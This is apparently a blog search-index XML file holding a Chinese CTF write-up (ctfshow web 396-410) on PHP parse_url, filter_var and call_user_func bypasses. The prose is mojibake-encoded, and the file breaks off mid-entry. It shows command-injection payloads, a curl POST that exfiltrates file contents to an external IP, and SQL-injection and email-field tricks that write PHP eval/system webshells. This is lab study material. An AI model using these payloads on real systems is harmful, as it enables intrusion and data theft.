<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow-webå…¥é—¨-å…¶ä»–ï¼ˆ1ï¼‰</title>
      <link href="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/"/>
      <url>/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/</url>
      
        <content type="html"><![CDATA[<h1 id="18-å…¶ä»–"><a href="#18-å…¶ä»–" class="headerlink" title="18.å…¶ä»–"></a>18.å…¶ä»–</h1><p>é¶åœº&#x2F;æ¥æº: ctfshow</p><h1 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h1><p>é¢˜ç›®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    shell_exec(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>shell_exec</code>ä»»æ„ä»£ç æ‰§è¡Œå¯ä»¥é€šè¿‡<code>;,||,&amp;&amp;</code>åŒæ—¶æ‰§è¡Œå¤šä¸ªè¯­å¥ï¼Œé…åˆ<code>parse_url</code>ç»•è¿‡</p><p>payload:<code>?url=http://1/1;echo </code>cat *<code> &gt; a.txt;</code></p><p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä»hostä¸‹æ‰‹è¿˜æ˜¯path</p><h1 id="web397-400ï¼ˆparse-urlè·¯å¾„rceï¼‰"><a href="#web397-400ï¼ˆparse-urlè·¯å¾„rceï¼‰" class="headerlink" title="web397-400ï¼ˆparse_urlè·¯å¾„rceï¼‰"></a>web397-400ï¼ˆparse_urlè·¯å¾„rceï¼‰</h1><p>é¢˜ç›®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    shell_exec(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p><code>?url=http://127/echo </code>cat *<code> &gt; a.txt</code></p><h1 id="web401-402ï¼ˆparse-urlåè®®ç»•è¿‡rceï¼‰"><a href="#web401-402ï¼ˆparse-urlåè®®ç»•è¿‡rceï¼‰" class="headerlink" title="web401-402ï¼ˆparse_urlåè®®ç»•è¿‡rceï¼‰"></a>web401-402ï¼ˆparse_urlåè®®ç»•è¿‡rceï¼‰</h1><p>é¢˜ç›®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    var_dump(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        die(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        shell_exec(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=xxx://<span class="number">127</span>/<span class="built_in">echo</span> `cat *` &gt; a.txt</span><br></pre></td></tr></table></figure><h1 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h1><p>é¢˜ç›®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123; <span class="comment">#è¡¨ç¤ºåŒ¹é…ipv4åœ°å€</span></span><br><span class="line">        shell_exec(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">^xxè¡¨ç¤ºä»¥xxå¼€å¤´</span></span><br><span class="line"><span class="string">2[0-4]\d è¡¨ç¤º200-249</span></span><br><span class="line"><span class="string">|è¡¨ç¤ºæˆ–</span></span><br><span class="line"><span class="string">25[0-5] è¡¨ç¤º250-255</span></span><br><span class="line"><span class="string">[01]?\d\d è¡¨ç¤º000-199</span></span><br><span class="line"><span class="string">\. è¡¨ç¤ºå°æ•°ç‚¹.</span></span><br><span class="line"><span class="string">&#123;3&#125;() è¡¨ç¤ºæ‹¬å·å‰é¢å†…å®¹å‡ºç°ä¸‰æ¬¡</span></span><br><span class="line"><span class="string">$è¡¨ç¤ºç»“å°¾</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/;<span class="built_in">echo</span> `ls` &gt; a.txt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web405"><a href="#web405" class="headerlink" title="web405"></a><strong>web405</strong></h1><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = parse_url($_GET[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, $url[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, $url[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, $url[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                shell_exec(<span class="string">&#x27;curl &#x27;</span>.$url[<span class="string">&#x27;scheme&#x27;</span>].$url[<span class="string">&#x27;host&#x27;</span>].$url[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo <span class="string">&#x27;parse_url å¥½å¼ºå¤§&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£æï¼š</p><p><code>host</code>åªèƒ½ä¸ºipåœ°å€</p><p><code>path</code>åªèƒ½åŒ…å«å­—æ¯å’Œæ•°å­—</p><p><code>scheme</code>åè®®å¿…é¡»åŒ…å«<code>~</code>ï¼Œ<code>.</code>ï¼Œ<code>php</code></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»<code>scheme</code>ä¸‹æ‰‹</p><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?url=php://;curl -X POST -d <span class="string">&quot;q=`cat *`&quot;</span> <span class="number">106.55</span><span class="number">.188</span><span class="number">.110</span>;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/f</span><br><span class="line"></span><br><span class="line">-X æŒ‡å®šè¯·æ±‚æ–¹å¼</span><br><span class="line">-q æŒ‡å®šå‚æ•°</span><br><span class="line">`` é‡Œé¢çš„å†…å®¹ä¼šå…ˆè¢«æ‰§è¡Œå†å‘é€</span><br></pre></td></tr></table></figure><h1 id="web406"><a href="#web406" class="headerlink" title="web406"></a><strong>web406</strong></h1><p>é¢˜ç›®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">require <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">//flag <span class="keyword">in</span> db</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;&#123;<span class="variable">$url</span>&#125;&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸é€šè¿‡&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>filter_var ($url,FILTER_VALIDATE_URL)</code>éªŒè¯<code>$url</code>æ˜¯ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„urlï¼ˆè‡³å°‘åŒ…æ‹¬åè®®å’Œè·¯å¾„ï¼‰</p><p><code>FILTER_SANITIZE_URL</code>ï¼šåˆ é™¤æ‰€æœ‰å­—ç¬¦ï¼Œé™¤äº†å­—æ¯ã€æ•°å­—ä»¥åŠ <code>$-_.+!*&#39;(),&#123;&#125;|\^~[]&lt;&gt;#%â€;/?ğŸ˜¡&amp;=</code>ï¼ˆå¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰&lt;&gt;ï¼Œæ‰€ä»¥ä¸‹é¢éœ€è¦è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼‰</p><p>ä½¿ç”¨</p><p>payloadï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">0</span>://www.baidu.com;<span class="string">&#x27;union/**/select/**/1,0x3c3f706870206576616c28245f504f53545b615d293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/5.php&quot;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3c3f706870206576616c28245f504f53545b615d293b3f3e åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼š&lt;?php eval($_POST[a]);?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸå†™å…¥shellï¼Œä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥</p><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®æç¤º<code>flag in db</code>ï¼Œflagåœ¨æ•°æ®åº“å½“ä¸­ï¼Œè€Œèšå‰‘è¿æ¥åˆ°çš„è´¦å·åªæ˜¯<code>www-data</code>æƒé™ï¼Œä¸èƒ½è¿æ¥mysql</p><p><img src="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" class="lazyload placeholder" data-srcset="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>æ‰€ä»¥è¿™é‡Œæœ‰ä¸‰ç§æ€è·¯</p><p>1.å¯¹Linuxç”¨æˆ·è¿›è¡Œææƒ</p><p>2.ä½¿ç”¨phpçš„mysqlè¯­å¥æŸ¥è¯¢</p><p>3.å†™ä¸€ä¸ªæœ‰sqlæ³¨å…¥çš„åŠŸèƒ½ç‚¹ä»£ç ï¼Œç„¶åä½¿ç”¨sqlmapè·‘</p><p>ç›´æ¥åœ¨idnex.phpè¿›è¡Œä¿®æ”¹</p><p><img src="/Untitled-%201.png" class="lazyload placeholder" data-srcset="/Untitled-%201.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å¾—åˆ°flag</p><p><img src="/Untitled-%202.png" class="lazyload placeholder" data-srcset="/Untitled-%202.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_varÂ </span>(<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">Â Â Â Â <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">cafe</span></span>&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">public</span><span class="title function_ invoke__">Â staticÂ functionÂ add</span>()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span><span class="title function_ invoke__">Â file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>call_user_func()å‡½æ•°æ¥å—å¤šä¸ªå‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ–¹æ³•æˆ–å‡½æ•°åï¼Œåé¢ä½œä¸ºå‚æ•°è¿›è¡Œè°ƒç”¨</p><ul><li><p><code>call_user_func($callback [, $parameter1 [, $parameter2 [, ... ]]])</code></p></li><li><p><code>call_user_func</code>çš„ä¸€äº›ç”¨æ³•ï¼Œåˆ†ä¸ºæ™®é€šå‡½æ•°ï¼Œç±»æ–¹æ³•ï¼Œé™æ€æ–¹æ³•å’ŒåŒ¿åå‡½æ•°</p><p>  <strong>ç¤ºä¾‹ 1ï¼šè°ƒç”¨æ™®é€šå‡½æ•°</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;greet&#x27;</span>, <span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure><p>  è¾“å‡ºä¸ºï¼šHello, John!</p><p>  <strong>ç¤ºä¾‹ 2ï¼šè°ƒç”¨ç±»æ–¹æ³•</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>([<span class="variable">$obj</span>, <span class="string">&#x27;sayHello&#x27;</span>], <span class="string">&#x27;John&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  è¾“å‡ºä¸ºï¼šHello, John!</p><p>  <strong>ç¤ºä¾‹ 3ï¼šè°ƒç”¨é™æ€æ–¹æ³•</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Math</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$num</span> * <span class="variable">$num</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>([<span class="string">&#x27;Math&#x27;</span>, <span class="string">&#x27;square&#x27;</span>], <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// è¾“å‡º 25</span></span><br></pre></td></tr></table></figure><p>  <strong>ç¤ºä¾‹ 4ï¼šè°ƒç”¨åŒ¿åå‡½æ•°ï¼ˆé—­åŒ…ï¼‰</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$greet</span>, <span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>filter_var</code>Â æŒ‡å®šä¸€ä¸ªè¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</p></li></ul><p>è€Œ<code>filter_varÂ ($ip,FILTER_VALIDATE_IP)</code>ï¼Œåˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯ä¸æ˜¯ip</p><p>å¯ä»¥ä½¿ç”¨<code>ipçš„é›¶å‹ç¼©æ³•</code>è¿›è¡Œç»•è¿‡ï¼Œ</p><blockquote><p>ipçš„é›¶å‹ç¼©æ³•ï¼š</p><p>IPv6åœ°å€æ˜¯ä¸€ä¸ª128ä½é•¿çš„äºŒè¿›åˆ¶æ•°ï¼Œé€šå¸¸ä»¥8ç»„16è¿›åˆ¶æ•°çš„å½¢å¼è¡¨ç¤ºï¼Œæ¯ç»„è¡¨ç¤º16ä½ï¼ˆ4ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼‰ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªIPv6åœ°å€å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8:0000:0000:0000:0000:1428:57ab</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨é›¶å‹ç¼©æ³•ä¸­ï¼Œè¿ç»­çš„å…¨é›¶æ®µå¯ä»¥è¢«ç®€åŒ–è¡¨ç¤ºä¸ºåŒå†’å· <code>::</code>ï¼Œä½†æ˜¯ <code>::</code> åªèƒ½å‡ºç°ä¸€æ¬¡ã€‚è¿™æ ·å¯ä»¥å¤§å¹…å‡å°‘åœ°å€çš„é•¿åº¦ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨é›¶å‹ç¼©æ³•è¡¨ç¤ºçš„ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8::1428:57ab</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œè¿ç»­çš„é›¶æ®µ <code>0000:0000:0000:0000</code> è¢«æ›¿æ¢ä¸º <code>::</code>ï¼Œä½¿å¾—åœ°å€æ›´åŠ ç®€æ´ã€‚</p></blockquote><p>è€Œåœ¨phpä¸­<code>cafe::add</code> è¡¨ç¤ºè°ƒç”¨åä¸º <code>add</code> çš„é™æ€æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å±äº <code>cafe</code> ç±»</p><p>å› ä¸ºè¿™ä¸¤è€…çš„å·®å¼‚ï¼Œå½¢æˆäº†è¿™ä¸€ä¸ªç»•è¿‡æ–¹æ³•</p><p>payloadï¼š<code>?ip=cafe::add</code></p><h1 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¼å¼ä¸ºï¼š<code>å†™å…¥å†…å®¹@å†™å…¥æ–‡ä»¶å</code></p><p>æ³¨æ„å‡ ä¸ªç‚¹ï¼š</p><ol><li>å†™å…¥å†…å®¹éƒ¨åˆ†è¦ç”¨åŒå¼•å·åŒ…èµ·æ¥</li><li>å†™å…¥å†…å®¹ä¸èƒ½å«æœ‰ç©ºæ ¼</li></ol><p>payload:<code>?email=&quot;&lt;?=system($_GET[1]);?&gt;&quot;@1.php</code></p><h1 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123; <span class="comment">#æ£€æµ‹æ˜¯å¦ç¬¦åˆé‚®ç®±æ ¼å¼ xxx@xxx</span></span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>); <span class="comment">#æŠŠflagå’Œå‰é¢ä¸€ä¸ªå­—ç¬¦æ›¿æ¢ä¸ºç©ºï¼ˆå»é™¤ï¼‰</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>); <span class="comment">#æ‰§è¡Œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸º@åé¢çš„å†…å®¹ä¸ç¬¦åˆPHPè¯­æ³•ï¼Œæ‰€ä»¥é€šè¿‡é—­åˆå»é™¤æ‰</p><p>å¯è¡Œä½†æ˜¯å‘ç°å‰é¢çš„â€ä¹Ÿæ˜¯éæ³•çš„<br>é¢˜ç›®æœ‰ä¸ªæ›¿æ¢ä¸º.flagä¹Ÿå°±æ˜¯æŠŠflagå’Œå®ƒå‰é¢é‚£ä¸ªå­—ç¬¦æ›¿æ¢ä¸ºç©ºï¼Œè¿™å°±å¯ä»¥æŠŠemaiå½“ä¸­å‰é¢åŒå¼•å·è¿™ä¸ªéæ³•å­—ç¬¦ç»™æ›¿æ¢æ‰ï¼Œé¿å…åœ¨phpç¯å¢ƒé‡Œé¢å‡ºé”™</p><p>æœ€ç»ˆpaylaodï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;flagsystem(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.com</span><br><span class="line">ç„¶åpostæ•°æ®</span><br><span class="line"><span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span 